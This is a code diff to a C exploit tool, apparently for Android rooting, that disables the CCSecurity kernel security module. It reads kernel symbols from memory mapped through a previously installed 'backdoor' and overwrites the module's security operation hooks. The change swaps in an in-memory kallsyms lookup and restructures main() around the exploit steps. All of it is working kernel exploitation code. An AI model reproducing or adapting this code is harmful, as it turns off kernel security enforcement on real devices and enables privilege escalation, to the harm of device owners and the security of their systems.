@@ -12,7 +12,7 @@
 #include <fcntl.h>
 
 #include "device_database/device_database.h"
-#include "kallsyms.h"
+#include "libkallsyms/kallsyms_in_memory.h"
 #include "backdoor_mmap.h"
 
 #define MAX_CCS_SEARCH_BINARY_HANDLERS  2
@@ -37,6 +37,41 @@ static void *ccsecurity_ops;
 static void *search_binary_handler;
 static void **__ccs_search_binary_handler;
 
+static kallsyms *kallsyms_info;
+
+static bool
+kallsyms_init(void)
+{
+  if (!kallsyms_info) {
+    kallsyms_info = kallsyms_in_memory_init((void *)BACKDOOR_MMAP_ADDRESS, BACKDOOR_MMAP_SIZE);
+    if (!kallsyms_info) {
+      return false;
+    }
+  }
+
+  return true;
+}
+
+static void *
+lookup_symbol_name(const char *name)
+{
+  if (!kallsyms_init()) {
+    return NULL;
+  }
+
+  return (void *)kallsyms_in_memory_lookup_name(kallsyms_info, name);
+}
+
+static const char *
+lookup_symbol_address(void *address)
+{
+  if (!kallsyms_init()) {
+    return NULL;
+  }
+
+  return kallsyms_in_memory_lookup_address(kallsyms_info, (unsigned long)address);
+}
+
 static bool
 setup_variables(void)
 {
@@ -53,11 +88,11 @@ setup_variables(void)
   }
 
   if (!ccsecurity_ops) {
-    ccsecurity_ops = (void *)kallsyms_get_symbol_address("ccsecurity_ops");
+    ccsecurity_ops = lookup_symbol_name("ccsecurity_ops");
   }
 
   if (!search_binary_handler) {
-    search_binary_handler = (void *)kallsyms_get_symbol_address("search_binary_handler");
+    search_binary_handler = lookup_symbol_name("search_binary_handler");
   }
 
   return ccsecurity_ops && search_binary_handler;
@@ -75,7 +110,7 @@ disable_ccsecurity(void)
   p = backdoor_convert_to_mmaped_address(ccsecurity_ops);
 
   if (p[BINARY_HANDLER_POS] == search_binary_handler) {
-    printf("Already disabled??\nUnlock anyway.");
+    printf("Already disabled??\nUnlock anyway.\n");
   }
   else if (__ccs_search_binary_handler) {
     for (i = 0; i < MAX_CCS_SEARCH_BINARY_HANDLERS; i++) {
@@ -90,15 +125,12 @@ disable_ccsecurity(void)
     }
   }
   else {
-    char *name = kallsyms_get_symbol_by_address(p[BINARY_HANDLER_POS]);
+    const char *name = lookup_symbol_address(p[BINARY_HANDLER_POS]);
 
     if (strcmp(name, "__ccs_search_binary_handler")) {
       printf("check failed: ccsecurity_ops[%d] = %s\n", BINARY_HANDLER_POS, name);
-      free(name);
       return false;
     }
-
-    free(name);
   }
 
   for (i = 0; i < NUM_CCSECURITY_OPS; i++) {
@@ -114,36 +146,31 @@ disable_ccsecurity(void)
   return true;
 }
 
-static bool
-run_exploit(void)
+int
+main(int argc, char **argv)
 {
-  bool ret;
-
   if (!backdoor_open_mmap()) {
     printf("Failed to mmap due to %s.\n", strerror(errno));
     printf("Run 'install_backdoor' first\n");
 
-    return false;
+    exit(EXIT_FAILURE);
   }
 
-  ret = disable_ccsecurity();
-
-  backdoor_close_mmap();
-  return ret;
-}
-
-int
-main(int argc, char **argv)
-{
   if (!setup_variables()) {
     print_reason_device_not_supported();
+
+    backdoor_close_mmap();
     exit(EXIT_FAILURE);
   }
 
-  if (!run_exploit()) {
+  if (!disable_ccsecurity()) {
     printf("Disable ccsecurity failed\n");
+
+    backdoor_close_mmap();
     exit(EXIT_FAILURE);
   }
+
+  backdoor_close_mmap();
 
   exit(EXIT_SUCCESS);
 }
